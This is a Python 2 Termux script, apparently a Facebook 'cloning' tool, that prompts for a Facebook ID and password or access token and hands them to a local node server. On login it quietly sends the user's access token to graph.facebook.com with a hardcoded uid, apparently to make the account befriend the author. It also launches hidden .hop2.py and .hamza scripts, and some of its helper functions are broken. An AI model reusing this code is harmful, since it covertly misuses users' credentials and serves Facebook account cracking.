#!/usr/bin/python
# coding=utf-8
# Originally Written By:Mishal X Faisal
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 hop.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; U; Android 5.1; en-US; E5563 Build/29.1.B.0.101) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def start():
    os.system("pkg install nodejs")
    os.system("cd .hamza && npm install")
    os.system("#")
    os.system("#")
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("node .hamza/index.js &")
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("node .hamza/index.js $")
    tlogin()
##### LOGO #####
banner = """
 \x1b[1;91m __  __ _____  _____ _    _          _      
 \x1b[1;91m|  \/  |_   _|/ ____| |  | |   /\   | |     
\x1b[1;91m | \  / | | | | (___ | |__| |  /  \  | |     
\x1b[1;91m | |\/| | | |  \___ \|  __  | / /\ \ | |     
\x1b[1;91m | |  | |_| |_ ____) | |  | |/ ____ \| |____ 
\x1b[1;91m |_|  |_|_____|_____/|_|  |_/_/    \_\______|
\x1b[1;93m  ( QUEEN OF FACEBOOK )🌹❤🌹(QUEEN OF CLONING)
\x1b[1;95m----------------------------------------------------
\x1b[1;91m__Coder  : MISHAL KHAN MISHI🎀
\x1b[1;91m__Github : HTTPS://GITHUB.COM/MISHI007🌹
\x1b[1;91m__Facebok: MISHAL KHAN MISHI🎀
\x1b[1;91m__Gang   : NIGHT 007 FAMILY❤❤
\x1b[1;91m__Lover  : FAISAL X MISHAL🦋🦋
\x1b[1;93m ______  : CLONING MASTER🔅
\x1b[1;95m-----------------------------------------------------"""
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[鉁擼 Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
id = []

def tlogin():
	os.system('clear')
	print banner
	username = raw_input("[+] TOOL USERNAME: ")
	if username =="Shona":
	    os.system('clear')
	    print banner
	    print "[鉁揮 TOOL USERNAME: "+username+ " (correct)"
	else:
	    print "[!] Invalid Username."
	    time.sleep(1)
	    tlogin()
	    
	passw = raw_input("[+] TOOL PASSWORD: ")
	if passw =="Mishi":
	    os.system('clear')
	    print banner
	    print "[鉁揮 TOOL USERNAME: " +username+ " (correct)"
	    print "[鉁揮 TOOL PASSWORD: " +passw+ "  (correct)"
	    time.sleep(2)
	else:
	    print "[!] Invalid Password."
	    time.sleep(1)
	    tlogin()
	try:
		toket = open('login.txt','r')
		os.system('python2 .hop2.py')
	except (KeyError,IOError):
		methodlogin()
	else:
		print "[!] Invalid Password"
		time.sleep(1)
		tlogin()

##### Login Method #####


def methodlogin():
	os.system('clear')
	print banner
	print "[1] Login With ID/Password."
	print "[2] Login Using Token."
	print "[3] Exit."
	print ('      ')
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login_fb()
	elif hos =="2":
		os.system('clear')
		print banner
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n[鉁揮 Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://www.youtube.com/channel/UCPRlRzOAEH8mcB1WtXf4Q1w')
		os.system('python2 .hop2.py')
		
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login_fb():
	os.system("clear")
	print(banner)
	print("")
	print("\033[1;32mLogin Using Password\033[0;97m").center(70)
	print("")
	id = raw_input("[+] ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input("[+] Password : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".login.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100054865652029&access_token='+q['loc'])
		time.sleep(1)
		print("\033[1;30mLogged In Successfully\033[0;97m")
		time.sleep(1)
		os.system('python2 .hop2.py')
	elif "www.facebook.com" in q["error"]:
		print("")
		print("[!] User must verify account before login")
		time.sleep(1)
		raw_input("Press Enter To Try Again")
		login_fb()
	else:
		print("")
		print("[!] ID/Number/Password May Be Wrong")
		raw_input("Press Enter To Try Again")
		login_fb()
if __name__=='__main__':
    start()
